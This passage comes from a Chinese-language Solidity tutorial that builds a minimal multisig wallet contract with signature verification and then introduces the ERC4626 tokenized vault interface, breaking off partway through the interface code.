start="5"><li>利用选择器<code>0xc2985578</code>，在代理合约中调用新逻辑合约<code>UUPS2</code>的<code>foo()</code>函数，将<code>words</code>的值改为<code>&quot;new&quot;</code>。</li></ol><p><img src="/img/web3/49-7.jpg" alt="49-6"></p><h1 id="50-多签钱包"><a href="#50-多签钱包" class="headerlink" title="50. 多签钱包"></a>50. 多签钱包</h1><h2 id="多签钱包"><a href="#多签钱包" class="headerlink" title="多签钱包"></a>多签钱包</h2><p>多签钱包是一种电子钱包，特点是交易被多个私钥持有者（多签人）授权后才能执行：例如钱包由<code>3</code>个多签人管理，每笔交易需要至少<code>2</code>人签名授权。多签钱包可以防止单点故障（私钥丢失，单人作恶），更加去中心化，更加安全，被很多DAO采用。</p><p>Gnosis Safe多签钱包是以太坊最流行的多签钱包，管理近400亿美元资产，合约经过审计和实战测试，支持多链（以太坊，BSC，Polygon等），并提供丰富的DAPP支持。更多信息可以阅读我在21年12月写的<a href="https://peopledao.mirror.xyz/nFCBXda8B5ZxQVqSbbDOn2frFDpTxNVtdqVBXGIjj0s">Gnosis Safe使用教程</a>。</p><h2 id="多签钱包合约"><a href="#多签钱包合约" class="headerlink" title="多签钱包合约"></a>多签钱包合约</h2><p>在以太坊上的多签钱包其实是智能合约，属于合约钱包。下面我们写一个极简版多签钱包<code>MultisigWallet</code>合约，它的逻辑非常简单：</p><ol><li><p>设置多签人和门槛（链上）：部署多签合约时，我们需要初始化多签人列表和执行门槛（至少n个多签人签名授权后，交易才能执行）。Gnosis Safe多签钱包支持增加&#x2F;删除多签人以及改变执行门槛，但在咱们的极简版中不考虑这一功能。</p></li><li><p>创建交易（链下）：一笔待授权的交易包含以下内容</p><ul><li><code>to</code>：目标合约。</li><li><code>value</code>：交易发送的以太坊数量。</li><li><code>data</code>：calldata，包含调用函数的选择器和参数。</li><li><code>nonce</code>：初始为<code>0</code>，随着多签合约每笔成功执行的交易递增的值，可以防止签名重放攻击。</li><li><code>chainid</code>：链id，防止不同链的签名重放攻击。</li></ul></li><li><p>收集多签签名（链下）：将上一步的交易ABI编码并计算哈希，得到交易哈希，然后让多签人签名，并拼接到一起得到打包签名。对ABI编码和哈希不了解的，可以看WTF Solidity极简教程<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/27_ABIEncode/readme.md">第27讲</a>和<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/28_Hash/readme.md">第28讲</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">交易哈希: 0xc1b055cf8e78338db21407b425114a2e258b0318879327945b661bfdea570e66<br><br>多签人A签名: 0x014db45aa753fefeca3f99c2cb38435977ebb954f779c2b6af6f6365ba4188df542031ace9bdc53c655ad2d4794667ec2495196da94204c56b1293d0fbfacbb11c<br><br>多签人B签名: 0xbe2e0e6de5574b7f65cad1b7062be95e7d73fe37dd8e888cef5eb12e964ddc597395fa48df1219e7f74f48d86957f545d0fbce4eee1adfbaff6c267046ade0d81c<br><br>打包签名：<br>0x014db45aa753fefeca3f99c2cb38435977ebb954f779c2b6af6f6365ba4188df542031ace9bdc53c655ad2d4794667ec2495196da94204c56b1293d0fbfacbb11cbe2e0e6de5574b7f65cad1b7062be95e7d73fe37dd8e888cef5eb12e964ddc597395fa48df1219e7f74f48d86957f545d0fbce4eee1adfbaff6c267046ade0d81c<br></code></pre></td></tr></table></figure></li><li><p>调用多签合约的执行函数，验证签名并执行交易（链上）。对验证签名和执行交易不了解的，可以看WTF Solidity极简教程<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md">第22讲</a>和<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/37_Signature/readme.md">第37讲</a>。</p></li></ol><h3 id="事件-3"><a href="#事件-3" class="headerlink" title="事件"></a>事件</h3><p><code>MultisigWallet</code>合约有<code>2</code>个事件，<code>ExecutionSuccess</code>和<code>ExecutionFailure</code>，分别在交易成功和失败时释放，参数为交易哈希。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">event ExecutionSuccess(bytes32 txHash);    // 交易成功事件<br>event ExecutionFailure(bytes32 txHash);    // 交易失败事件<br></code></pre></td></tr></table></figure><h3 id="状态变量-3"><a href="#状态变量-3" class="headerlink" title="状态变量"></a>状态变量</h3><p><code>MultisigWallet</code>合约有<code>5</code>个状态变量：</p><ol><li><code>owners</code>：多签持有人数组</li><li><code>isOwner</code>：<code>address =&gt; bool</code>的映射，记录一个地址是否为多签持有人。</li><li><code>ownerCount</code>：多签持有人数量</li><li><code>threshold</code>：多签执行门槛，交易至少有n个多签人签名才能被执行。</li><li><code>nonce</code>：初始为<code>0</code>，随着多签合约每笔成功执行的交易递增的值，可以防止签名重放攻击。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">address[] public owners;                   // 多签持有人数组 <br>mapping(address =&gt; bool) public isOwner;   // 记录一个地址是否为多签持有人<br>uint256 public ownerCount;                 // 多签持有人数量<br>uint256 public threshold;                  // 多签执行门槛，交易至少有n个多签人签名才能被执行。<br>uint256 public nonce;                      // nonce，防止签名重放攻击<br></code></pre></td></tr></table></figure><h3 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h3><p><code>MultisigWallet</code>合约有<code>6</code>个函数：</p><ol><li><p>构造函数：调用<code>_setupOwners()</code>，初始化和多签持有人和执行门槛相关的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 构造函数，初始化owners, isOwner, ownerCount, threshold <br>constructor(        <br>    address[] memory _owners,<br>    uint256 _threshold<br>) &#123;<br>    _setupOwners(_owners, _threshold);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>_setupOwners()</code>：在合约部署时被构造函数调用，初始化<code>owners</code>，<code>isOwner</code>，<code>ownerCount</code>，<code>threshold</code>状态变量。传入的参数中，执行门槛需大于等于<code>1</code>且小于等于多签人数；多签地址不能为<code>0</code>地址且不能重复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev 初始化owners, isOwner, ownerCount,threshold <br>/// @param _owners: 多签持有人数组<br>/// @param _threshold: 多签执行门槛，至少有几个多签人签署了交易<br>function _setupOwners(address[] memory _owners, uint256 _threshold) internal &#123;<br>    // threshold没被初始化过<br>    require(threshold == 0, &quot;WTF5000&quot;);<br>    // 多签执行门槛 小于或等于 多签人数<br>    require(_threshold &lt;= _owners.length, &quot;WTF5001&quot;);<br>    // 多签执行门槛至少为1<br>    require(_threshold &gt;= 1, &quot;WTF5002&quot;);<br><br>    for (uint256 i = 0; i &lt; _owners.length; i++) &#123;<br>        address owner = _owners[i];<br>        // 多签人不能为0地址，本合约地址，不能重复<br>        require(owner != address(0) &amp;&amp; owner != address(this) &amp;&amp; !isOwner[owner], &quot;WTF5003&quot;);<br>        owners.push(owner);<br>        isOwner[owner] = true;<br>    &#125;<br>    ownerCount = _owners.length;<br>    threshold = _threshold;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>execTransaction()</code>：在收集足够的多签签名后，验证签名并执行交易。传入的参数为目标地址<code>to</code>，发送的以太坊数额<code>value</code>，数据<code>data</code>，以及打包签名<code>signatures</code>。打包签名就是将收集的多签人对交易哈希的签名，按多签持有人地址从小到大顺序，打包到一个[bytes]数据中。这一步调用了<code>encodeTransactionData()</code>编码交易，调用了<code>checkSignatures()</code>检验签名是否有效、数量是否达到执行门槛。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev 在收集足够的多签签名后，执行交易<br>/// @param to 目标合约地址<br>/// @param value msg.value，支付的以太坊<br>/// @param data calldata<br>/// @param signatures 打包的签名，对应的多签地址由小到达，方便检查。 (&#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125;) (第一个多签的签名, 第二个多签的签名 ... )<br>function execTransaction(<br>    address to,<br>    uint256 value,<br>    bytes memory data,<br>    bytes memory signatures<br>) public payable virtual returns (bool success) &#123;<br>    // 编码交易数据，计算哈希<br>    bytes32 txHash = encodeTransactionData(to, value, data, nonce, block.chainid);<br>    nonce++;  // 增加nonce<br>    checkSignatures(txHash, signatures); // 检查签名<br>    // 利用call执行交易，并获取交易结果<br>    (success, ) = to.call&#123;value: value&#125;(data);<br>    require(success , &quot;WTF5004&quot;);<br>    if (success) emit ExecutionSuccess(txHash);<br>    else emit ExecutionFailure(txHash);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>checkSignatures()</code>：检查签名和交易数据的哈希是否对应，数量是否达到门槛，若否，交易会revert。单个签名长度为65字节，因此打包签名的长度要长于或等于<code>threshold * 65</code>。调用了<code>signatureSplit()</code>分离出单个签名。这个函数的大致思路：</p><ul><li>用ecdsa获取签名地址.</li><li>利用 <code>currentOwner &gt; lastOwner</code> 确定签名来自不同多签（多签地址递增）。</li><li>利用<code>isOwner[currentOwner]</code>确定签名者为多签持有人。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev 检查签名和交易数据是否对应。如果是无效签名，交易会revert<br> * @param dataHash 交易数据哈希<br> * @param signatures 几个多签签名打包在一起<br> */<br>function checkSignatures(<br>    bytes32 dataHash,<br>    bytes memory signatures<br>) public view &#123;<br>    // 读取多签执行门槛<br>    uint256 _threshold = threshold;<br>    require(_threshold &gt; 0, &quot;WTF5005&quot;);<br><br>    // 检查签名长度足够长<br>    require(signatures.length &gt;= _threshold * 65, &quot;WTF5006&quot;);<br><br>    // 通过一个循环，检查收集的签名是否有效<br>    // 大概思路：<br>    // 1. 用ecdsa先验证签名是否有效<br>    // 2. 利用 currentOwner &gt; lastOwner 确定签名来自不同多签（多签地址递增）<br>    // 3. 利用 isOwner[currentOwner] 确定签名者为多签持有人<br>    address lastOwner = address(0); <br>    address currentOwner;<br>    uint8 v;<br>    bytes32 r;<br>    bytes32 s;<br>    uint256 i;<br>    for (i = 0; i &lt; _threshold; i++) &#123;<br>        (v, r, s) = signatureSplit(signatures, i);<br>        // 利用ecrecover检查签名是否有效<br>        currentOwner = ecrecover(keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, dataHash)), v, r, s);<br>        require(currentOwner &gt; lastOwner &amp;&amp; isOwner[currentOwner], &quot;WTF5007&quot;);<br>        lastOwner = currentOwner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>signatureSplit()</code>：将单个签名从打包的签名分离出来，参数分别为打包签名<code>signatures</code>和要读取的签名位置<code>pos</code>。利用了内联汇编，将签名的<code>r</code>，<code>s</code>，和<code>v</code>三个值分离出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// 将单个签名从打包的签名分离出来<br>/// @param signatures 打包签名<br>/// @param pos 要读取的多签index.<br>function signatureSplit(bytes memory signatures, uint256 pos)<br>    internal<br>    pure<br>    returns (<br>        uint8 v,<br>        bytes32 r,<br>        bytes32 s<br>    )<br>&#123;<br>    // 签名的格式：&#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125;<br>    assembly &#123;<br>        let signaturePos := mul(0x41, pos)<br>        r := mload(add(signatures, add(signaturePos, 0x20)))<br>        s := mload(add(signatures, add(signaturePos, 0x40)))<br>        v := and(mload(add(signatures, add(signaturePos, 0x41))), 0xff)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>encodeTransactionData()</code>：将交易数据打包并计算哈希，利用了<code>abi.encode()</code>和<code>keccak256()</code>函数。这个函数可以计算出一个交易的哈希，然后在链下让多签人签名并收集，再调用<code>execTransaction()</code>函数执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev 编码交易数据<br>/// @param to 目标合约地址<br>/// @param value msg.value，支付的以太坊<br>/// @param data calldata<br>/// @param _nonce 交易的nonce.<br>/// @param chainid 链id<br>/// @return 交易哈希bytes.<br>function encodeTransactionData(<br>    address to,<br>    uint256 value,<br>    bytes memory data,<br>    uint256 _nonce,<br>    uint256 chainid<br>) public pure returns (bytes32) &#123;<br>    bytes32 safeTxHash =<br>        keccak256(<br>            abi.encode(<br>                to,<br>                value,<br>                keccak256(data),<br>                _nonce,<br>                chainid<br>            )<br>        );<br>    return safeTxHash;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="51-ERC4626-代币化金库标准"><a href="#51-ERC4626-代币化金库标准" class="headerlink" title="51. ERC4626 代币化金库标准"></a>51. ERC4626 代币化金库标准</h1><h2 id="金库"><a href="#金库" class="headerlink" title="金库"></a>金库</h2><p>金库合约是 DeFi 乐高中的基础，它允许你把基础资产（代币）质押到合约中，换取一定收益，包括以下应用场景:</p><ul><li>收益农场: 在 Yearn Finance 中，你可以质押 <code>USDT</code> 获取利息。</li><li>借贷: 在 AAVE 中，你可以出借 <code>ETH</code> 获取存款利息和贷款。</li><li>质押: 在 Lido 中，你可以质押 <code>ETH</code> 参与 ETH 2.0 质押，得到可以生息的 <code>stETH</code>。</li></ul><h2 id="ERC4626"><a href="#ERC4626" class="headerlink" title="ERC4626"></a>ERC4626</h2><p><img src="/img/web3/51-1.png" alt="51-1"></p><p>由于金库合约缺乏标准，写法五花八门，一个收益聚合器需要写很多接口对接不同的 DeFi 项目。ERC4626 代币化金库标准（Tokenized Vault Standard）横空出世，使得 DeFi 能够轻松扩展。它具有以下优点:</p><ol><li>代币化: ERC4626 继承了 ERC20，向金库存款时，将得到同样符合 ERC20 标准的金库份额，比如质押 ETH，自动获得 stETH。</li><li>更好的流通性: 由于代币化，你可以在不取回基础资产的情况下，利用金库份额做其他事情。拿 Lido 的 stETH 为例，你可以用它在 Uniswap 上提供流动性或交易，而不需要取出其中的 ETH。</li><li>更好的可组合性: 有了标准之后，用一套接口可以和所有 ERC4626 金库交互，让基于金库的应用、插件、工具开发更容易。</li></ol><p>总而言之，ERC4626 对于 DeFi 的重要性不亚于 ERC721 对于 NFT 的重要性。</p><h3 id="ERC4626-要点"><a href="#ERC4626-要点" class="headerlink" title="ERC4626 要点"></a>ERC4626 要点</h3><p>ERC4626 标准主要实现了以下几个逻辑：</p><ol><li>ERC20: ERC4626 继承了 ERC20，金库份额就是用 ERC20 代币代表的：用户将特定的 ERC20 基础资产（比如 WETH）存进金库，合约会给他铸造特定数量的金库份额代币；当用户从金库中提取基础资产时，会销毁相应数量的金库份额代币。<code>asset()</code> 函数会返回金库的基础资产的代币地址。</li><li>存款逻辑：让用户存入基础资产，并铸造相应数量的金库份额。相关函数为 <code>deposit()</code> 和 <code>mint()</code>。<code>deposit(uint assets, address receiver)</code> 函数让用户存入 <code>assets</code> 单位的资产，并铸造相应数量的金库份额给 <code>receiver</code> 地址。<code>mint(uint shares, address receiver)</code> 与它类似，只不过是以将铸造的金库份额作为参数。</li><li>提款逻辑：让用户销毁金库份额，并提取金库中相应数量的基础资产。相关函数为 <code>withdraw()</code> 和 <code>redeem()</code>，前者以取出基础资产数量为参数，后者以销毁的金库份额为参数。</li><li>会计和限额逻辑：ERC4626 标准中其他的函数是为了统计金库中的资产，存款&#x2F;提款限额，和存款&#x2F;提款的基础资产和金库份额数量。</li></ol><h3 id="IERC4626-接口合约"><a href="#IERC4626-接口合约" class="headerlink" title="IERC4626 接口合约"></a>IERC4626 接口合约</h3><p>IERC4626 接口合约共包含 <code>2</code> 个事件:</p><ul><li><code>Deposit</code> 事件: 存款时触发。</li><li><code>Withdraw</code> 事件: 取款时触发。</li></ul><p>IERC4626 接口合约还包含 <code>16</code> 个函数，根据功能分为 <code>4</code> 大类：元数据，存款&#x2F;提款逻辑，会计逻辑，和存款&#x2F;提款限额逻辑。</p><ul><li><p>元数据</p><ul><li><code>asset()</code>: 返回金库的基础资产代币地址，用于存款，取款。</li></ul></li><li><p>存款&#x2F;提款逻辑</p><ul><li><code>deposit()</code>: 存款函数，用户向金库存入 <code>assets</code> 单位的基础资产，然后合约铸造 <code>shares</code> 单位的金库额度给 <code>receiver</code> 地址。会释放 <code>Deposit</code> 事件。</li><li><code>mint()</code>: 铸造函数（也是存款函数），用户指定想获得的 <code>shares</code> 单位的金库额度，函数经过计算后得出需要存入的 <code>assets</code> 单位的基础资产数量，然后合约从用户账户转出 <code>assets</code> 单位的基础资产，再给 <code>receiver</code> 地址铸造指定数量的金库额度。会释放 <code>Deposit</code> 事件。</li><li><code>withdraw()</code>: 提款函数，<code>owner</code> 地址销毁 <code>share</code> 单位的金库额度，然后合约将相应数量的基础资产发送给 <code>receiver</code> 地址。</li><li><code>redeem()</code>: 赎回函数（也是提款函数），<code>owner</code> 地址销毁 <code>shares</code> 数量的金库额度，然后合约将相应单位的基础资产发给 <code>receiver</code> 地址</li></ul></li><li><p>会计逻辑</p><ul><li><code>totalAssets()</code>: 返回金库中管理的基础资产代币总额。</li><li><code>convertToShares()</code>: 返回利用一定数额基础资产可以换取的金库额度。</li><li><code>convertToAssets()</code>: 返回利用一定数额金库额度可以换取的基础资产。</li><li><code>previewDeposit()</code>: 用于用户在当前链上环境模拟存款一定数额的基础资产能够获得的金库额度。</li><li><code>previewMint()</code>: 用于用户在当前链上环境模拟铸造一定数额的金库额度需要存款的基础资产数量。</li><li><code>previewWithdraw()</code>: 用于用户在当前链上环境模拟提款一定数额的基础资产需要赎回的金库份额。</li><li><code>previewRedeem()</code>: 用于链上和链下用户在当前链上环境模拟销毁一定数额的金库额度能够赎回的基础资产数量。</li></ul></li><li><p>存款&#x2F;提款限额逻辑</p><ul><li><code>maxDeposit()</code>: 返回某个用户地址单次存款可存的最大基础资产数额。</li><li><code>maxMint()</code>: 返回某个用户地址单次铸造可以铸造的最大金库额度。</li><li><code>maxWithdraw()</code>: 返回某个用户地址单次取款可以提取的最大基础资产额度。</li><li><code>maxRedeem()</code>: 返回某个用户地址单次赎回可以销毁的最大金库额度。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// Author: 0xAA from WTF Academy<br><br>pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol&quot;;<br><br>/**<br> * @dev ERC4626 &quot;代币化金库标准&quot;的接口合约<br> * https://eips.ethereum.org/EIPS/eip-4626[ERC-4626].<br> */<br>interface IERC4626 is IERC20, IERC20Metadata &#123;<br>    /*//////////////////////////////////////////////////////////////<br>                                 事件<br>    //////////////////////////////////////////////////////////////*/<br>    // 存款时触发<br>    event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);<br><br>    // 取款时触发<br>    event Withdraw(<br>        address indexed sender,<br>        address indexed receiver,<br>        address indexed owner,<br>        uint256 assets,<br>        uint256 shares<br>    );<br><br>    /*//////////////////////////////////////////////////////////////<br>                            元数据<br>    //////////////////////////////////////////////////////////////*/<br>    /**<br>     * @dev 返回金库的基础资产代币地址 （用于存款，取款）<br>     * - 必须是 ERC20 代币合约地址.<br>     * - 不能revert<br>     */<br>    function asset() external view returns (address assetTokenAddress);<br><br>    /*//////////////////////////////////////////////////////////////<br>                        存款/提款逻辑<br>    //////////////////////////////////////////////////////////////*/<br>    /**<br>     * @dev 存款函数: 用户向金库存入 assets 单位的基础资产，然后合约铸造 shares 单位的金库额度给 receiver 地址<br>     *<br>     * - 必须释放 Deposit 事件.<br>     * - 如果资产不能存入，必须revert，比如存款数额大大于上限等。<br>     */<br>    function deposit(uint256 assets, address receiver) external returns (uint256 shares);<br><br>    /**<br>     * @dev 铸造函数: 用户需要存入 assets 单位的基础资产，然后合约给 receiver 地址铸造 share 数量的金库额度<br>     * - 必须释放 Deposit 事件.<br>     * - 如果全部金库额度不能铸造，必须revert，比如铸造数额大大于上限等。<br>     */<br>    function mint(uint256 shares, address receiver) external returns (uint256 assets);<br><br>    /**<br>     * @dev 提款函数: owner 地址销毁 share 单位的金库额度，然后合约将 assets 单位的基础资产发送给 receiver 地址<br>     * - 释放 Withdraw 事件<br>     * - 如果全部基础资产不能提取，将revert<br>     */<br>    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);<br><br>    /**<br>     * @dev 赎回函数: owner 地址销毁 shares 数量的金库额度，然后合约将 assets 单位的基础资产发给 receiver 地址<br>     * - 释放 Withdraw 事件<br>     * - 如果金库额度不能全部销毁，则revert<br>     */<br>    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);<br><br>    /*//////////////////////////////////////////////////////////////<br>                            会计逻辑<br>    //////////////////////////////////////////////////////////////*/<br><br>    /**<br>     * @dev 返回金库中管理的基础资产代币总额<br>     * - 要包含利息<br>     * - 要包含费用<br>     * - 不能revert<br>     */<br>    function totalAssets() external view returns (uint256 totalManagedAssets);<br><br>    /**<br>     * @dev 返回利用一定数额基础资产可以换取的金库额度<br>     * - 不要包含费用<br>     * - 不包含滑点<br>     * - 不能revert<br>     */<br>    function convertToShares(uint256 assets) external view returns (uint256 shares);<br><br>    /**<br>     * @dev 返回利用一定数额金库额度可以换取的基础资产<br>     * - 不要包含费用<br>     * - 不包含滑点<br>     * - 不能revert<br>     */<br>    function convertToAssets(uint256 shares) external view returns (uint256 assets);<br><br>    /**<br>     * @dev 用于链上和链下用户在当前链上环境模拟存款一定数额的基础资产能够获得的金库额度<br>     * - 返回值要接近且不大于在同一交易进行存款得到的金库额度<br>     * - 不要考虑 maxDeposit 等限制，假设用户的存款交易会成功<br>     * - 要考虑费用<br>     * - 不能revert<br>     * NOTE: 可以利用 convertToAssets 和 previewDeposit 返回值的差值来计算滑点<br>     */<br>    function previewDeposit(uint256 assets) external view returns (uint256 shares);<br><br>    /**<br>     * @dev 用于链上和链下用户在当前链上环境模拟铸造 shares 数额的金库额度需要存款的基础资产数量<br>     * - 返回值要接近且不小于在同一交易进行铸造一定数额金库额度所需的存款数量<br>     * - 不要考虑 maxMint 等限制，假设用户的存款交易会成功<br>     * - 要考虑费用<br>     * - 不能revert<br>     */<br>    function previewMint(uint256 shares) external view returns (uint256 assets);<br><br>    /**<br>     * @dev 用于链上和链下用户在当前链上环境模拟提款 assets 数额的基础资产需要赎回的金库份额<br>     * - 返回值要接近且不大于在同一交易进行提款一定数额基础资产所需赎回的金库份额<br>     * - 不要考虑 maxWithdraw 等限制，假设用户的提款交易会成功<br>     * - 要考虑费用<br>     * - 不能revert<br>     */<br>    function previewWithdraw(uint256 assets) external view returns (uint256 shares);<br><br>    /**<br>     * @dev 用于链上和链下用户在当前链上环境模拟销毁 shares 数额的金库额度能够赎回的基础资产数量<br>  